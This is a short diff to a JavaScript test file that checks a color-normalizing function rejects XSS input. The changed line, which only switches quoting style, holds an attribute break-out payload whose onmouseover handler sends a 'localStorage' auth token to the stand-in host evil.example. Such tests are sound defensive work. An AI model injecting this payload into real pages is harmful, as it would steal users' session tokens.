@@ -30,7 +30,7 @@ describe('normalizeKeywordColor — valid hex', () => {
 describe('normalizeKeywordColor — XSS payloads', () => {
   test('rejects an attribute break-out with an event handler', () => {
     const payload =
-      'red" onmouseover="fetch(\'https://evil.example/?d=\'+encodeURIComponent(localStorage.getItem(\'auth_token\')))';
+      "red\" onmouseover=\"fetch('https://evil.example/?d='+encodeURIComponent(localStorage.getItem('auth_token')))";
     expect(normalizeKeywordColor(payload).ok).toBe(false);
   });
 
